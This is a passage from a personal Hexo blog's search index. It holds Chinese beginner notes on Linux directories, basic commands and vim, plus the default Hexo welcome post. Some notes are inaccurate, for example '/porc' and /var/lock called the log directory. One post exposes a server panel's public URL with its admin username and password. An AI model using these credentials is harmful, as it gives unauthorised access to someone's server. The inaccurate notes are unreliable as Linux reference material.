id="x2F-lib"><a href="#x2F-lib" class="headerlink" title="&#x2F;lib"></a>&#x2F;lib</h4><p>存放着系统最基本的动态来链接共享库</p><h6 id="x2F-media"><a href="#x2F-media" class="headerlink" title="&#x2F;media"></a>&#x2F;media</h6><p>Linux识别的U盘光驱等在这个文件下</p><h6 id="x2F-mnt"><a href="#x2F-mnt" class="headerlink" title="&#x2F;mnt"></a>&#x2F;mnt</h6><p>暂时挂载别的别的文件系统的，</p><h6 id="x2F-opt"><a href="#x2F-opt" class="headerlink" title="&#x2F;opt"></a>&#x2F;opt</h6><p>给主机额外安装软件所设置的目录</p><h6 id="x2F-root"><a href="#x2F-root" class="headerlink" title="&#x2F;root"></a>&#x2F;root</h6><p>系统管理员的，超级权限者的用户主目录</p><h4 id="x2F-sbin"><a href="#x2F-sbin" class="headerlink" title="&#x2F;sbin"></a>&#x2F;sbin</h4><p>系统管理员的系统管理程序</p><h6 id="x2F-srv"><a href="#x2F-srv" class="headerlink" title="&#x2F;srv"></a>&#x2F;srv</h6><p>启动后需要提取的数据</p><h6 id="x2F-tmp"><a href="#x2F-tmp" class="headerlink" title="&#x2F;tmp"></a>&#x2F;tmp</h6><p>存放临时文件</p><h6 id="x2F-lost-found"><a href="#x2F-lost-found" class="headerlink" title="&#x2F;lost+found"></a>&#x2F;lost+found</h6><p>系统非法关机，会存放在这里</p><h6 id="x2F-porc"><a href="#x2F-porc" class="headerlink" title="&#x2F;porc"></a>&#x2F;porc</h6><p>虚拟目录，是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息</p><h6 id="x2F-sys"><a href="#x2F-sys" class="headerlink" title="&#x2F;sys"></a>&#x2F;sys</h6><p>针对进程信息的proc文件系统，针对设备的devfs文件系统以及针对伪终端的devpts文件系统</p><h6 id="x2F-selinux"><a href="#x2F-selinux" class="headerlink" title="&#x2F;selinux"></a>&#x2F;selinux</h6><p>是Redhat和centos所特有的目录是一种安全机制，类似于防火墙</p><h4 id="x2F-var目录的意义和内容"><a href="#x2F-var目录的意义和内容" class="headerlink" title="&#x2F;var目录的意义和内容"></a>&#x2F;var目录的意义和内容</h4><h6 id="x2F-var-x2F-cache-x2F"><a href="#x2F-var-x2F-cache-x2F" class="headerlink" title="&#x2F;var&#x2F;cache&#x2F;"></a>&#x2F;var&#x2F;cache&#x2F;</h6><p>应用程序本身运作中会产生的一些暂存性</p><h6 id="x2F-var-x2F-lib-x2F"><a href="#x2F-var-x2F-lib-x2F" class="headerlink" title="&#x2F;var&#x2F;lib&#x2F;"></a>&#x2F;var&#x2F;lib&#x2F;</h6><p>程序运行中，需要使用的数据文件放置的目录，各自有各自的目录</p><h6 id="x2F-var-x2F-lock-x2F"><a href="#x2F-var-x2F-lock-x2F" class="headerlink" title="&#x2F;var&#x2F;lock&#x2F;"></a>&#x2F;var&#x2F;lock&#x2F;</h6><p>日志的目录</p><h6 id="x2F-var-x2F-mail-x2F"><a href="#x2F-var-x2F-mail-x2F" class="headerlink" title="&#x2F;var&#x2F;mail&#x2F;"></a>&#x2F;var&#x2F;mail&#x2F;</h6><p>存放邮件的目录</p><h6 id="x2F-var-x2F-run-x2F"><a href="#x2F-var-x2F-run-x2F" class="headerlink" title="&#x2F;var&#x2F;run&#x2F;"></a>&#x2F;var&#x2F;run&#x2F;</h6><p>系统运行以来，描述系统信息的文件</p><h6 id="x2F-var-x2F-spool-x2F"><a href="#x2F-var-x2F-spool-x2F" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;"></a>&#x2F;var&#x2F;spool&#x2F;</h6><p>打印队列和其他队列工作的目录，每个spool在这里都有自己的子目录</p><h1 id="三-Linux的常用命令"><a href="#三-Linux的常用命令" class="headerlink" title="三 Linux的常用命令"></a>三 Linux的常用命令</h1><h6 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h6><p>xxxxx  # rm 选项 文件或者目录</p><p>-f 强制删除</p><p>-i 提示删除</p><p>-r 递归删除</p><h6 id="more"><a href="#more" class="headerlink" title="more"></a>more</h6><p>xxxxx # more 选项 文件名</p><p>-f 计算行数，实际的行数，不是自动换行的过后的</p><p>-p  不卷动显示每一页先清屏在显示内容</p><p>-c 先显示再清屏旧的</p><p>-s 当遇到连续以上两行空格，会替换成一行</p><p>-u  不显示下引号</p><p>+n  从第n行开始显示</p><p>-n   一行显示n个</p><h6 id="find"><a href="#find" class="headerlink" title="find"></a>find</h6><p>查找命令</p><p>xxxxxx #find 路径 选项 输出形式</p><p>-表示￥home目录   路径</p><p>.表示当前目录</p><p>&#x2F;表示根目录</p><p>选项</p><p>-name 名字</p><p>-perm 权限</p><p>-prune不在当前目录找</p><p>-user 文件属主来查找</p><p>-group 文件所属组来查找</p><p>-nogroup 查找无有效所属组的文件</p><p>-nouser 查找无有效属主的文件</p><p>-type 文件类型查找</p><p>输出形式</p><p>print  标准输出</p><p>exec 对匹配的文件执行该参数的shell命令，形式为command（）\；</p><p>ok 与exec作用相同，区别在于执行前会询问是否执行</p><h6 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h6><p>xxxx# grep 选项 模式文件名</p><p>-c 仅列出文件中包含模式的行数</p><p>-i 忽略模式中大小写</p><p>-l 列出带有匹配名的文件</p><p>-n 每一行前列出列号</p><p>-v 列出没有匹配模式的行</p><p>-w 把表达式当作一个完整的单字符来搜寻忽略部分匹配的行</p><h2 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h2><p>&#x2F;word 向光标之下寻找一个名称为word 的字符串</p><p>?word 向光标之上找</p><p>n 代表重复之前的一个搜寻的动作</p><p>N重复之前的搜寻的反动作</p><p><img src="C:\Users\13766\Desktop\网络笔记\mmexport1646048505566.jpg" alt="mmexport1646048505566"></p><p>vim有三种编辑模式</p><p>命令模式</p><p>字符按键和shift的组合  ；输入字符</p><p>enter；回车换行</p><p>back space：退格，删除光标前一个</p><p>del 删除键  删除光标后一个</p><p>方向键 移动光标 ’</p><p>home&#x2F;end：移动光标到首位&#x2F;尾部</p><p>page up&#x2F;down 上下翻页</p><p>insert；切换插入和替换</p><p>esc 推出</p><p>输入模式 </p><p>底线命令模式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/03/12/%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE/"/>
      <url>/2022/03/12/%E7%AC%AC%E4%BA%8C%E8%8A%82%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="第二节课"><a href="#第二节课" class="headerlink" title="第二节课"></a>第二节课</h1><hr><h2 id="title-1"><a href="#title-1" class="headerlink" title="title: 1"></a>title: 1</h2><p>请用浏览器访问面板:<br>外网:<a href="http://221.198.219.201:9080/B018F3">http://221.198.219.201:9080/B018F3</a><br>内网:<a href="http://192.168.71.130:9080/B018F3">http://192.168.71.130:9080/B018F3</a><br>系统初始账号:admin<br>系统初始密码:Ng6ozncdWf<br>官网:<a href="https://www.xp.cn/">https://www.xp.cn</a><br>如果使用的是云服务器，请至安全组开放9080端口<br>如果使用ftp，请开放21以及30000-30050端口</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1</title>
      <link href="/2022/03/12/hello-world/"/>
      <url>/2022/03/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
